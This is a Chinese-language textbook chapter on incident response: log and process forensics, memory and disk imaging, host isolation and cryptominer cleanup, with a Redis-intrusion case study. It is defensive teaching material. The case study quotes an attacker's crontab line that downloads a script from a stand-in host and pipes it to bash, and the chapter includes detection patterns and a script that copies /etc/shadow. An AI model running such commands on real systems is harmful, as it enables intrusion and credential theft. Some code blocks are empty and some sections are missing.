# 第十六章 应急响应与安全监控

## 16.1 应急响应概述

### 16.1.1 应急响应的重要性

在网络安全领域，"没有被入侵的系统，只有还没被发现被入侵的系统"。无论安全防护体系多么完善，都无法百分之百杜绝安全事件的发生。因此，建立完善的应急响应体系，在安全事件发生时能够快速、有效地进行处置，将损失降到最低，是网络安全工作的重要组成部分。

应急响应（Incident Response，简称IR）是指针对安全事件的响应和处理过程。它不仅是技术工作，更是涉及管理、流程、法律等多个方面的系统性工作。一个完善的应急响应体系可以帮助组织：

- **减少损失**：快速发现和遏制安全事件，减少数据泄露和系统损坏
- **缩短恢复时间**：有预案的响应可以大大缩短系统恢复正常运行的时间
- **防止二次攻击**：通过分析攻击手段，修补漏洞，防止攻击者再次入侵
- **满足合规要求**：很多行业法规（如等保2.0、GDPR、PCI-DSS）都要求建立应急响应机制
- **积累经验教训**：每次事件都是一次学习机会，可以持续改进安全防护

### 16.1.2 NIST SP 800-61应急响应流程

美国国家标准与技术研究院（NIST）发布的SP 800-61《计算机安全事件处理指南》是业界最权威的应急响应参考标准之一。它将应急响应分为四个阶段：

**阶段一：准备阶段（Preparation）**

准备阶段是在事件发生之前进行的工作，目的是建立应急响应能力。包括：

- 建立应急响应团队（IRT/CERT）
- 制定应急预案和流程
- 准备应急工具和资源
- 进行安全培训和演练
- 建立日志和监控系统
- 建立备份机制

**阶段二：检测与分析阶段（Detection and Analysis）**

检测与分析阶段是发现安全事件并进行初步分析的过程：

- 监控系统和网络异常
- 收集告警信息
- 初步分析事件性质和影响范围
- 确认是否为真实安全事件
- 进行事件定级

**阶段三：遏制、根除与恢复阶段（Containment, Eradication & Recovery）**

这是应急响应的核心阶段：

- **遏制**：防止事件进一步扩大，隔离受感染系统
- **根除**：清除恶意代码、后门，修复漏洞
- **恢复**：恢复系统正常运行，验证系统完整性

**阶段四：事后活动阶段（Post-Incident Activity）**

事件处理完成后的总结和改进：

- 编写事件报告
- 总结经验教训
- 改进安全防护措施
- 更新应急预案
- 进行人员培训

### 16.1.3 PDCERF模型

除了NIST模型，业界还有PDCERF模型，将应急响应分为六个阶段：

1. **准备（Preparation）** - 建立应急能力
2. **检测（Detection）** - 发现安全事件
3. **遏制（Containment）** - 防止事件扩大
4. **根除（Eradication）** - 清除威胁根源
5. **恢复（Recovery）** - 恢复系统正常
6. **跟踪（Follow-up）** - 事后总结改进

### 16.1.4 应急响应团队组建

一个完善的应急响应团队（IRT，Incident Response Team）应该包含以下角色：

**团队领导（Team Leader）**
- 负责整体协调和决策
- 向上级汇报事件进展
- 协调内外部资源

**技术分析人员（Technical Analysts）**
- 系统安全分析师：负责系统日志分析、系统入侵检测
- 网络安全分析师：负责网络流量分析、防火墙日志分析
- 恶意代码分析师：负责病毒、木马、勒索软件分析
- 取证分析师：负责电子证据收集和分析

**其他支持人员**
- 法务顾问：提供法律支持，确保取证合法
- 公关人员：负责对外沟通和新闻发布
- 人力资源：涉及内部人员事件时提供支持
- 业务部门代表：评估业务影响，协调业务恢复

## 16.2 事件检测与识别

### 16.2.1 常见的安全事件类型

**系统入侵类**
- 暴力破解成功（SSH、FTP、数据库）
- WebShell上传
- 系统提权
- 未授权访问

**恶意代码类**
- 勒索病毒感染
- 挖矿木马
- Rootkit后门
- 僵尸网络

**数据泄露类**
- 数据库拖库
- 敏感文件泄露
- 内部数据外传

**拒绝服务类**
- DDoS攻击
- CC攻击
- 资源耗尽

### 16.2.2 日志分析检测

日志是发现安全事件的最重要信息来源。Linux系统中有多种日志需要监控：

**系统日志（/var/log/messages 或 /var/log/syslog）**

```bash
# 查看系统日志中的异常登录
grep -i "failed\|failure\|error" /var/log/messages | tail -50

# 查看sudo使用记录
grep "sudo" /var/log/secure 2>/dev/null || grep "sudo" /var/log/auth.log

# 查看认证日志
cat /var/log/secure 2>/dev/null | head -100
cat /var/log/auth.log 2>/dev/null | head -100
```

**认证日志分析**

```bash
# 统计登录失败次数最多的IP
grep "Failed password" /var/log/secure 2>/dev/null | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20

# 查看登录成功的记录
grep "Accepted" /var/log/secure 2>/dev/null

# 查看root登录记录
grep "Accepted.*root" /var/log/secure 2>/dev/null

# 查看异常时间段的登录（如凌晨登录）
grep "Accepted" /var/log/secure 2>/dev/null | grep -E "(0[0-5]|2[0-3]):" 
```

**Web服务器日志分析**

```bash
# Nginx日志分析 - 查找SQL注入特征
grep -iE "(union.*select|select.*from|drop table|insert into|--)" /var/log/nginx/access.log

# 查找WebShell访问特征
grep -iE "(cmd=|shell=|pass=|eval\(|exec\()" /var/log/nginx/access.log

# 统计访问量最高的IP
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20

# 查找404错误最多的URL
awk '$9 == 404 {print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20
```

### 16.2.3 进程异常检测

异常进程是系统被入侵的重要迹象。

```bash
# 查看所有进程（详细）
ps auxf

# 查看占用CPU最高的进程
ps aux --sort=-%cpu | head -20

# 查看占用内存最高的进程
ps aux --sort=-%mem | head -20

# 查看可疑进程（没有关联终端的进程）
ps aux | grep -v "tty\|pts\|?" | head -20

# 查看进程树
pstree -p

# 查看进程打开的文件
lsof -p <PID>

# 查看进程监听的端口
lsof -i -P -n | grep LISTEN

# 查看进程的可执行文件路径
ls -la /proc/<PID>/exe

# 查看进程的命令行参数
cat /proc/<PID>/cmdline | tr '\0' ' '

# 查看进程的环境变量
cat /proc/<PID>/environ | tr '\0' '\n'
```

**常见可疑进程特征：**

- 进程名看起来像系统进程但路径不对（如/sbin/sshd实际在/tmp下）
- 隐藏进程名（如空格、特殊字符）
- 占用大量CPU或内存的不明进程
- 监听异常端口的进程
- 以root运行的不明进程

### 16.2.4 网络连接分析

```bash
# 查看所有网络连接
ss -tulnp

# 查看所有ESTABLISHED连接
ss -tn state established

# 查看连接最多的IP
ss -tn state established | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20

# 查看监听端口
netstat -tulnp 2>/dev/null || ss -tulnp

# 查看与特定IP的连接
ss -tn | grep "192.168.1.100"

# 查看DNS请求（使用tcpdump）
tcpdump -i any udp port 53 -n -v

# 抓包保存文件
tcpdump -i eth0 -w capture.pcap -c 1000

# 实时查看网络流量
iftop -i eth0
nload eth0
```

### 16.2.5 文件完整性检查

攻击者往往会修改系统文件或植入后门。

```bash
# 检查最近24小时内修改过的文件
find / -type f -mtime -1 2>/dev/null | head -50

# 检查最近1小时内修改过的文件
find / -type f -mmin -60 2>/dev/null | head -50

# 检查/etc目录下的修改
find /etc -type f -mtime -7 2>/dev/null

# 检查/tmp目录下的可疑文件
ls -la /tmp/
find /tmp -type f -executable 2>/dev/null

# 检查/dev/shm目录（常在内存中，重启消失）
ls -la /dev/shm/

# 检查crontab中的可疑任务
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# 检查系统关键文件的MD5
md5sum /bin/ls /bin/ps /usr/bin/top /sbin/sshd
```

## 16.3 取证与分析

### 16.3.1 取证原则

电子取证需要遵循以下原则：

1. **合法性原则**：取证过程必须符合法律法规
2. **完整性原则**：确保证据完整，不被篡改
3. **可重复性原则**：取证方法可以重复验证
4. **最小影响原则**：尽量减少对原始系统的影响

### 16.3.2 内存取证

内存中包含大量有价值的信息，如运行中的进程、网络连接、加密密钥等。

**使用LiME提取内存镜像**

```bash
# 下载LiME源码
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src

# 编译（需要内核头文件）
make

# 加载模块并提取内存
insmod lime.ko "path=/mnt/usb/memory.lime format=lime"

# 完成后卸载模块
rmmod lime
```

**使用Volatility分析内存镜像**

```bash
# 查看镜像信息
volatility -f memory.lime imageinfo

# 查看进程列表
volatility -f memory.lime --profile=LinuxUbuntu1604x64 linux_pslist

# 查看进程树
volatility -f memory.lime --profile=LinuxUbuntu1604x64 linux_pstree

# 查看网络连接
volatility -f memory.lime --profile=LinuxUbuntu1604x64 linux_netstat

# 查看打开的文件
volatility -f memory.lime --profile=LinuxUbuntu1604x64 linux_lsof

# 查看bash历史
volatility -f memory.lime --profile=LinuxUbuntu1604x64 linux_bash

# 提取进程内存
volatility -f memory.lime --profile=LinuxUbuntu1604x64 linux_procdump -D output_dir -p <PID>
```

### 16.3.3 磁盘取证

**磁盘镜像制作**

```bash
# 使用dd制作磁盘镜像
dd if=/dev/sda of=/mnt/usb/disk.img bs=4M conv=noerror,sync

# 使用dcfldd（增强版dd，支持哈希验证）
dcfldd if=/dev/sda of=/mnt/usb/disk.img hash=md5,sha256 hashlog=hash.txt

# 验证镜像完整性
md5sum /dev/sda
md5sum /mnt/usb/disk.img
```

**磁盘镜像分析**

```bash
# 挂载镜像（只读）
mount -o ro,loop /mnt/usb/disk.img /mnt/disk

# 查看分区表
fdisk -l /mnt/usb/disk.img

# 挂载特定分区
mount -o ro,loop,offset=1048576 /mnt/usb/disk.img /mnt/disk

# 使用Autopsy/Sleuth Kit分析
tsk_recover /mnt/usb/disk.img output_dir

# 查看已删除文件
fls -rd /mnt/usb/disk.img
```

### 16.3.4 日志收集脚本

在应急响应中，快速收集系统信息非常重要。以下是一个日志收集脚本：

```bash
#!/bin/bash
# 应急响应信息收集脚本
# 使用方法: ./evidence_collect.sh [output_dir]

OUTPUT_DIR="${1:-/tmp/evidence_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUTPUT_DIR"

echo "[*] 开始收集证据，输出目录: $OUTPUT_DIR"

# 系统基本信息
echo "[+] 收集系统信息..."
uname -a > "$OUTPUT_DIR/uname.txt"
hostname > "$OUTPUT_DIR/hostname.txt"
cat /etc/os-release > "$OUTPUT_DIR/os_release.txt"
date > "$OUTPUT_DIR/date.txt"
uptime > "$OUTPUT_DIR/uptime.txt"

# 网络信息
echo "[+] 收集网络信息..."
ifconfig -a > "$OUTPUT_DIR/ifconfig.txt" 2>/dev/null || ip addr > "$OUTPUT_DIR/ip_addr.txt"
ss -tulnp > "$OUTPUT_DIR/ss_listen.txt"
ss -tan > "$OUTPUT_DIR/ss_all.txt"
netstat -antup > "$OUTPUT_DIR/netstat.txt" 2>/dev/null
iptables -L -n -v > "$OUTPUT_DIR/iptables.txt" 2>/dev/null

# 进程信息
echo "[+] 收集进程信息..."
ps auxf > "$OUTPUT_DIR/ps_auxf.txt"
ps -ef > "$OUTPUT_DIR/ps_ef.txt"
lsof -i -P -n > "$OUTPUT_DIR/lsof_network.txt" 2>/dev/null

# 用户信息
echo "[+] 收集用户信息..."
cat /etc/passwd > "$OUTPUT_DIR/passwd.txt"
cat /etc/shadow > "$OUTPUT_DIR/shadow.txt" 2>/dev/null
cat /etc/group > "$OUTPUT_DIR/group.txt"
last > "$OUTPUT_DIR/last.txt"
lastlog > "$OUTPUT_DIR/lastlog.txt"
who > "$OUTPUT_DIR/who.txt"
w > "$OUTPUT_DIR/w.txt"

# 日志文件
echo "[+] 复制日志文件..."
cp -r /var/log "$OUTPUT_DIR/logs" 2>/dev/null

# 计划任务
echo "[+] 收集计划任务..."
crontab -l > "$OUTPUT_DIR/crontab_root.txt" 2>/dev/null
ls -la /etc/cron.d/ > "$OUTPUT_DIR/cron_d.txt" 2>/dev/null
cat /etc/crontab > "$OUTPUT_DIR/crontab_sys.txt" 2>/dev/null

# 最近修改的文件
echo "[+] 收集最近修改的文件..."
find /etc -type f -mtime -7 -ls > "$OUTPUT_DIR/etc_modified_7d.txt" 2>/dev/null
find /tmp -type f -mtime -7 -ls > "$OUTPUT_DIR/tmp_modified_7d.txt" 2>/dev/null

# 可执行文件检查
echo "[+] 收集SUID/SGID文件..."
find / -perm -4000 -type f -ls > "$OUTPUT_DIR/suid_files.txt" 2>/dev/null
find / -perm -2000 -type f -ls > "$OUTPUT_DIR/sgid_files.txt" 2>/dev/null

# RPM/DPKG数据库检查
echo "[+] 收集包管理器信息..."
if command -v rpm &> /dev/null; then
    rpm -Va > "$OUTPUT_DIR/rpm_verify.txt" 2>/dev/null
fi
if command -v dpkg &> /dev/null; then
    dpkg -V > "$OUTPUT_DIR/dpkg_verify.txt" 2>/dev/null
fi

echo "[*] 证据收集完成！"
echo "[*] 输出目录: $OUTPUT_DIR"
du -sh "$OUTPUT_DIR"
```

## 16.4 系统隔离与遏制

### 16.4.1 网络隔离

发现系统被入侵后，首要任务是防止攻击扩大。

**使用iptables隔离**

```bash
# 只允许特定IP访问SSH，其他全部禁止
iptables -F INPUT
iptables -A INPUT -s 192.168.1.100 -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -P INPUT DROP

# 禁止出站连接（防止攻击者横向移动）
iptables -F OUTPUT
iptables -A OUTPUT -d 192.168.1.100 -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -P OUTPUT DROP

# 保存规则
iptables-save > /etc/sysconfig/iptables  # CentOS
netfilter-persistent save                 # Ubuntu/Debian
```

**使用firewalld隔离（CentOS 7+）**

```bash
# 切换到紧急模式（只允许SSH）
firewall-cmd --panic-on

# 关闭紧急模式
firewall-cmd --panic-off

# 只允许特定IP访问
firewall-cmd --permanent --add-source=192.168.1.100/32 --zone=trusted
firewall-cmd --permanent --add-service=ssh --zone=trusted
firewall-cmd --permanent --set-default-zone=drop
firewall-cmd --reload
```

**物理隔离（极端情况）**

如果攻击非常严重，可以考虑物理断网：
- 拔掉网线
- 关闭网络接口：`ifdown eth0` 或 `ip link set eth0 down`

### 16.4.2 进程隔离

```bash
# 查看可疑进程
ps aux | grep -E "(minerd|xmrig|kdevtmpfsi|kinsing|crypto)"

# 暂停进程（先暂停再分析，防止进程销毁证据）
kill -STOP <PID>

# 继续进程
kill -CONT <PID>

# 终止进程
kill <PID>          # 优雅终止
kill -9 <PID>       # 强制终止

# 批量杀死包含特定关键字的进程
pkill -f "minerd"
pkill -9 -f "xmrig"

# 查找并杀死所有可疑挖矿进程
ps aux | grep -E "(minerd|xmrig|kdevtmpfsi|cryptonight)" | grep -v grep | awk '{print $2}' | xargs kill -9
```

## 16.5 恶意软件清除

### 16.5.1 Rootkit检测与清除

Rootkit是一种能够隐藏自身存在的恶意软件，通常用于长期控制被入侵系统。

**常见Rootkit类型：**
- **内核级Rootkit**：加载到内核，隐藏效果最好
- **用户级Rootkit**：替换系统命令（如ls、ps、netstat）
- **应用级Rootkit**：嵌入到应用程序中

**Rootkit检测工具**

```bash
# 安装rkhunter
yum install rkhunter -y    # CentOS
apt install rkhunter -y    # Ubuntu

# 更新特征库
rkhunter --update

# 运行扫描
rkhunter --check
rkhunter --check --sk      # 跳过交互式确认

# 查看报告
```

### 16.5.2 挖矿木马清除

挖矿木马是目前最常见的恶意软件之一，会占用大量系统资源进行加密货币挖矿。

**常见挖矿木马家族：**
- XMRig（门罗币挖矿）
- Kinsing
- Kdevtmpfsi
- DDG
- GuardMiner

**挖矿木马检测**

```bash
# 检查高CPU占用进程
top
htop

# 查看可疑进程名
ps aux | grep -iE "(minerd|xmrig|kdevtmpfsi|kinsing|crypto|mine|monero)"

# 检查异常网络连接（连接矿池通常使用特定端口）
ss -tulnp | grep -E "(3333|5555|7777|8888|14433|14444|45700)"

# 检查定时任务（挖矿木马常通过crontab维持）
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/

# 检查系统服务
systemctl list-units --type=service | grep -iE "(mine|crypto|kinsing)"

# 检查/var/spool/cron/目录
ls -la /var/spool/cron/
cat /var/spool/cron/root 2>/dev/null

# 检查/tmp和/dev/shm目录
ls -la /tmp/
ls -la /dev/shm/
```

**挖矿木马清除步骤（详细）**

1. **停止挖矿进程**

```bash
# 查找挖矿进程PID
ps aux | grep -i minerd | grep -v grep

# 强制终止
kill -9 <PID>

# 批量杀死
ps aux | grep -E "(minerd|xmrig|kdevtmpfsi|kinsing)" | grep -v grep | awk '{print $2}' | xargs -r kill -9
```

2. **清除计划任务**

```bash
# 查看所有cron
crontab -l
ls -la /etc/cron.d/
cat /etc/crontab

# 编辑删除
crontab -e

# 删除所有cron（谨慎使用）
crontab -r
```

3. **删除恶意文件**

```bash
# 常见位置
rm -rf /tmp/minerd
rm -rf /tmp/xmrig
rm -rf /tmp/kdevtmpfsi
rm -rf /tmp/kinsing
rm -rf /dev/shm/kinsing
rm -rf /var/tmp/minerd
rm -rf /root/.ssh/kinsing

# 查找最近修改的可执行文件

```

4. **检查并清除系统服务**

```bash
# 查看所有服务

# 检查可疑服务

systemctl status minerd.service

# 禁用并删除

systemctl disable <service>

systemctl daemon-reload
```

5. **修复SSH密钥（防止再次入侵）**

```bash
# 检查authorized_keys
cat ~/.ssh/authorized_keys

# 删除可疑密钥
# 编辑文件删除不认识的公钥
vi ~/.ssh/authorized_keys

# 修改权限
chmod 600 ~/.ssh/authorized_keys
```

## 16.6 系统恢复

### 16.6.1 恢复前评估

在恢复系统之前，需要进行以下评估：

1. **确定系统是否可以安全恢复**
   - 如果Rootkit深入内核，建议重装系统

   - 确认备份的可用性
   
3. **确定攻击入口点**

   - 防止恢复后再次被入侵

## 16.8 综合实战案例

### 16.8.1 案例背景

某公司一台Web服务器（CentOS 7）突然变得非常卡顿，SSH连接缓慢，网站访问速度也明显下降。管理员接到告警后开始应急响应。

### 16.8.2 事件检测

**第一步：初步检查**

```bash
# 登录服务器，查看系统负载
$ uptime
 18:32:15 up 45 days,  3:12,  1 user,  load average: 8.56, 7.23, 5.45
# CPU负载8.56明显异常（4核服务器正常应<4）

# 查看CPU使用情况
$ top -bn1 | head -20
PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
32156 nobody    20   0  245620   45678   3456 R  98.7  2.3  125:34.23 kdevtmpfsi
 2345 nginx     20   0  123456   23456   5678 S   5.2  1.2   12:34.12 nginx
# kdevtmpfsi占用98.7% CPU，这是挖矿木马！
```

**第二步：深入分析**

```bash
# 查看进程详细信息
$ ps aux | grep kdevtmpfsi
nobody   32156 98.7  2.3 245620 45678 ?        Sl   10:24 125:34 /tmp/kdevtmpfsi

# 查看进程打开的网络连接
$ ss -tulnp | grep 32156
tcp    ESTAB    0    0    10.0.0.100:45678    192.0.2.100:45700
# 连接到矿池地址

# 检查定时任务
$ crontab -l
* * * * * wget -q -O - http://malicious.example.com/xms.sh | bash >/dev/null 2>&1
# 发现可疑定时任务！

# 检查SSH密钥
$ cat ~root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@hack.com
# 发现攻击者留下的公钥
```

### 16.8.3 事件遏制

```bash
# 1. 网络隔离（只允许管理员IP访问）
$ iptables -F INPUT
$ iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT
$ iptables -A INPUT -i lo -j ACCEPT
$ iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
$ iptables -P INPUT DROP
$ iptables -F OUTPUT
$ iptables -A OUTPUT -d 192.168.1.0/24 -j ACCEPT
$ iptables -A OUTPUT -o lo -j ACCEPT
$ iptables -P OUTPUT DROP

# 2. 停止挖矿进程
$ kill -9 32156
$ pkill -9 -f kdevtmpfsi
$ pkill -9 -f kinsing

# 3. 删除定时任务
$ crontab -r
$ rm -rf /etc/cron.d/kinsing
$ rm -rf /var/spool/cron/root

# 4. 清理SSH密钥
$ sed -i '/attacker@hack.com/d' ~root/.ssh/authorized_keys
```

### 16.8.4 攻击溯源

```bash
# 分析日志找到入侵时间和方式
$ grep "Accepted" /var/log/secure* | tail -20
/var/log/secure-20260618:Jun 18 03:25:12 server sshd[12345]: Accepted password for root from 203.0.113.50 port 54321 ssh2
# 发现6月18日凌晨有来自可疑IP的root登录

# 分析Redis日志（如果有Redis）
$ grep -i "config set" /var/log/redis/redis.log
# 可能通过Redis未授权访问写入公钥

# 检查Web应用日志
$ grep -i "upload" /var/log/nginx/access.log | grep -i php
# 检查是否通过WebShell上传
```

**攻击链还原：**

1. 攻击者通过端口扫描发现服务器Redis服务（6379端口）未授权访问
2. 利用Redis写入SSH公钥，获取root权限
3. 下载并运行挖矿木马（kdevtmpfsi/kinsing）
4. 设置定时任务维持持久化
5. 植入SSH后门密钥

### 16.8.5 漏洞修复

```bash
# 1. 加固Redis
$ vi /etc/redis.conf
# 绑定本地地址
bind 127.0.0.1
# 设置密码
requirepass StrongPassword123!
# 禁用危险命令
rename-command CONFIG ""
rename-command FLUSHALL ""
rename-command FLUSHDB ""
rename-command KEYS ""

$ systemctl restart redis

# 2. 加固SSH
$ vi /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers admin

$ systemctl restart sshd

# 3. 修改root密码
$ passwd root

# 4. 防火墙限制Redis端口
$ iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
$ iptables -A INPUT -p tcp --dport 6379 -j DROP

# 5. 更新系统
$ yum update -y
```

### 16.8.7 事件总结

**事件报告摘要：**
- 事件类型：服务器被入侵植入挖矿木马
- 入侵途径：Redis未授权访问漏洞
- 影响范围：1台Web服务器，CPU资源被大量占用
- 处理时长：2小时
- 经济损失：业务卡顿约4小时，无数据泄露

**改进措施：**
1. 所有Redis服务必须设置密码并绑定内网地址
2. 全面排查其他服务器的Redis安全配置
3. 部署安全监控系统（OSSEC、Prometheus）
4. 定期进行安全漏洞扫描
5. 加强员工安全培训
